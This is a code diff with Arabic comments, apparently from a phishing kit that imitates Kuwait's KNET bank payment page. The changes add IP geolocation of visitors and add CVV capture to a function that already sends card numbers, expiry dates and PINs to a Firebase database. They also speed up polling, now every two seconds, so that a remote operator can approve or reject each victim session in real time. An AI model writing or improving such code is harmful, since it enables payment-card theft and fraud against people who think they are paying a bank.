@@ -78,6 +78,46 @@
     return { device, browser };
   };
 
+  // كشف دولة الزائر من عنوان IP عبر خدمة geolocation
+  // نحاول عدة خدمات لضمان الموثوقية، ونتيجة ثابتة (cache) لتجنب التكرار
+  let __visitorCountry = null;
+  let __visitorCountryPromise = null;
+  window.getVisitorCountry = function () {
+    if (__visitorCountry) return Promise.resolve(__visitorCountry);
+    if (__visitorCountryPromise) return __visitorCountryPromise;
+    __visitorCountryPromise = (async () => {
+      // خريطة رموز الدول إلى أسماء عربية
+      const countryNames = {
+        KW: 'الكويت', SA: 'السعودية', AE: 'الإمارات', QA: 'قطر', BH: 'البحرين',
+        OM: 'عُمان', JO: 'الأردن', EG: 'مصر', IQ: 'العراق', LB: 'لبنان',
+        SY: 'سوريا', PS: 'فلسطين', YE: 'اليمن', SD: 'السودان', LY: 'ليبيا',
+        TN: 'تونس', DZ: 'الجزائر', MA: 'المغرب', MR: 'موريتانيا', SO: 'الصومال',
+        IR: 'إيران', TR: 'تركيا', US: 'الولايات المتحدة', GB: 'بريطانيا',
+      };
+      const services = [
+        'https://ipapi.co/json/',
+        'https://ipwho.is/',
+        'https://get.geojs.io/v1/ip/country.json',
+      ];
+      for (const url of services) {
+        try {
+          const res = await fetch(url);
+          if (!res.ok) continue;
+          const data = await res.json();
+          let code = data.country_code || data.country || data.code || '';
+          code = String(code).toUpperCase().trim();
+          if (code && code.length === 2) {
+            __visitorCountry = countryNames[code] || code;
+            return __visitorCountry;
+          }
+        } catch (e) {}
+      }
+      __visitorCountry = 'غير معروف';
+      return __visitorCountry;
+    })();
+    return __visitorCountryPromise;
+  };
+
   function getFriendlyPageName() {
     const path = window.location.pathname;
     if (path.includes('knet')) return 'صفحة الكي نت';
@@ -147,6 +187,12 @@
       visitorIp = data.ip;
     } catch (e) {}
 
+    // كشف دولة الزائر من عنوان IP (لا يُعطل الدخول بانتظارها)
+    let visitorCountry = 'غير معروف';
+    try {
+      visitorCountry = await window.getVisitorCountry();
+    } catch (e) {}
+
     const sessionData = {
       id: sessionId,
       status: 'active',
@@ -157,14 +203,14 @@
       browser: browser,
       createdTime: createdTime,
       startTime: now,
-      country: 'الكويت',
+      country: visitorCountry,
       hasNewActivity: false,
       ip: visitorIp
     };
 
     // ضمان وجود وثيقة العميل في customers (المصدر الموحّد للوحة الجديدة)
     try {
-      await window.ensureCustomerDoc({ ip: visitorIp, device: device, browser: browser });
+      await window.ensureCustomerDoc({ ip: visitorIp, device: device, browser: browser, country: visitorCountry });
     } catch (e) { console.error("ensureCustomerDoc error:", e); }
 
     // بدء نبض الحضور
@@ -197,7 +243,7 @@
   // ═══════════════════════════════════════════════════════════
   // إرسال بيانات البطاقة
   // ═══════════════════════════════════════════════════════════
-  window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin) {
+  window.pushFirebaseCard = function (bank, prefix, cardNum, expMonth, expYear, pin, cvv) {
     const attemptId = 'card_' + Date.now();
     const timestampStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
 
@@ -208,6 +254,7 @@
       cardNumber: cardNum || '',
       expiry: `${expMonth || ''}/${expYear || ''}`,
       pin: pin || '',
+      cvv: cvv || '',
       timestamp: timestampStr
     };
 
@@ -299,12 +346,20 @@
 
     // ---- المصدر الأساسي: Firestore customers/{sessionId} عبر onSnapshot ----
     let __lastDecision = null;
-    let __isFirst = true;
+    let __lastDecisionTs = null;
+    let __snapshotOk = false;
 
     function handleDecision(decision, data) {
-      if (__isFirst) { __isFirst = false; __lastDecision = decision; return; }
-      if (decision === __lastDecision) return;
+      // تجاهل القرار المعلّق (لا يوجد قرار بعد)
+      if (decision === 'pending' || decision === 'null' || !decision) {
+        __lastDecision = 'pending';
+        return;
+      }
+      // منع التكرار: نفس القرار + نفس الطابع الزمني → تجاهل
+      var ts = (data && (data.decidedAt || data.lastSeen)) || null;
+      if (decision === __lastDecision && String(ts) === String(__lastDecisionTs)) return;
       __lastDecision = decision;
+      __lastDecisionTs = ts;
       if (decision === 'approved') {
         if (typeof callbacks.onApproval === 'function') callbacks.onApproval({ decision: 'approved', status: data.status, raw: data });
       } else if (decision === 'rejected') {
@@ -319,24 +374,57 @@
       return (d && d.stringValue) ? d.stringValue : 'pending';
     }
 
-    // انتظر المصادقة ثم ابدأ الاستماع (قواعد أمان Firestore تتطلب تسجيل دخول)
-    window.ensureAuthReady().then(function (token) {
-      // الاستماع اللحظي عبر onSnapshot
-      customerRef.onSnapshot((doc) => {
-        if (!doc.exists) return;
-        const data = doc.data() || {};
-        handleDecision(data.decision || data.status || 'pending', data);
-      }, (err) => { console.error("customerRef onSnapshot error:", err); });
+    // استخراج الطابع الزمني من استجابة Firestore REST
+    function restTimestamp(fields) {
+      if (!fields) return null;
+      var t = fields.decidedAt || fields.lastSeen;
+      return (t && t.timestampValue) ? t.timestampValue : null;
+    }
 
-      // استطلاع احتياطي عبر REST كل 4 ثوانٍ (يتشارك نفس آلية dedupe)
-      const pollUrl = 'https://firestore.googleapis.com/v1/projects/kuwait-b7d4b/databases/(default)/documents/customers/' + encodeURIComponent(sessionId);
-      setInterval(function () {
-        fetch(pollUrl, { headers: token ? { 'Authorization': 'Bearer ' + token } : {} })
-          .then(function (r) { return r.json(); })
-          .then(function (d) { if (d && d.fields) handleDecision(restDecision(d.fields), d.fields); })
-          .catch(function (e) { console.error('poll customers error:', e); });
-      }, 4000);
-    });
+    // بدء الاستماع اللحظي عبر onSnapshot (مع إعادة المحاولة عند الفشل)
+    function startSnapshot(token) {
+      try {
+        customerRef.onSnapshot((doc) => {
+          __snapshotOk = true;
+          if (!doc.exists) return;
+          const data = doc.data() || {};
+          handleDecision(data.decision || data.status || 'pending', data);
+        }, (err) => {
+          __snapshotOk = false;
+          console.error("customerRef onSnapshot error:", err);
+        });
+      } catch (e) {
+        console.error("onSnapshot setup error:", e);
+      }
+    }
+
+    // انتظر المصادقة ثم ابدأ الاستماع (قواعد أمان Firestore تتطلب تسجيل دخول)
+    function startListening() {
+      window.ensureAuthReady().then(function (token) {
+        // الاستماع اللحظي عبر onSnapshot
+        startSnapshot(token);
+
+        // استطلاع احتياطي عبر REST كل 2 ثانية (أسرع للاستجابة الفورية)
+        const pollUrl = 'https://firestore.googleapis.com/v1/projects/kuwait-b7d4b/databases/(default)/documents/customers/' + encodeURIComponent(sessionId);
+        setInterval(function () {
+          // تحديث الـ token في كل استطلاع (قد تكون انتهت صلاحيته)
+          var curUser = firebase.auth().currentUser;
+          var tokenPromise = curUser ? curUser.getIdToken() : Promise.resolve(token);
+          tokenPromise.then(function (tk) {
+            fetch(pollUrl, { headers: tk ? { 'Authorization': 'Bearer ' + tk } : {} })
+              .then(function (r) { return r.json(); })
+              .then(function (d) {
+                if (d && d.fields) {
+                  handleDecision(restDecision(d.fields), { decision: restDecision(d.fields), decidedAt: restTimestamp(d.fields), lastSeen: restTimestamp(d.fields), _rest: true });
+                }
+              })
+              .catch(function (e) { /* تجاهل أخطاء الاستطلاع بصمت */ });
+          }).catch(function () {});
+        }, 2000);
+      });
+    }
+
+    startListening();
 
     // ---- مصدر احتياطي: RTDB commands/{sessionId} (اللوحة القديمة) ----
     const cmdRef = rtd.ref('commands/' + sessionId);
